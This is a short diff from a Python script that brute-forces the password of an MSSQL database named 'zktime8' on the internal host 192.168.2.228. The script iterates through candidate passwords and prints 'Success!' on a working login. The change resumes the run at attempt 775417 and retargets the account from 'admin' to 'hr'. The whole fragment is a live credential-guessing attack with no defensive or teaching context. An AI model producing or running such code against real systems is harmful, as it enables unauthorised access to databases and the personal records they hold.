@@ -82,9 +82,9 @@ def main(n):
     i = 0
     for j in password:
         i += 1
-        if i >= 0:  # 断点
+        if i >= 775417:  # 断点
             try:
-                ms = MsSql(host="192.168.2.228", user="admin", pwd=''.join(tuple(j)),
+                ms = MsSql(host="192.168.2.228", user="hr", pwd=''.join(tuple(j)),
                            db="zktime8")
                 query = ms.exec_query("SELECT GETDATE() AS CurrentDateTime")
                 print('Success!', j, ';', query)
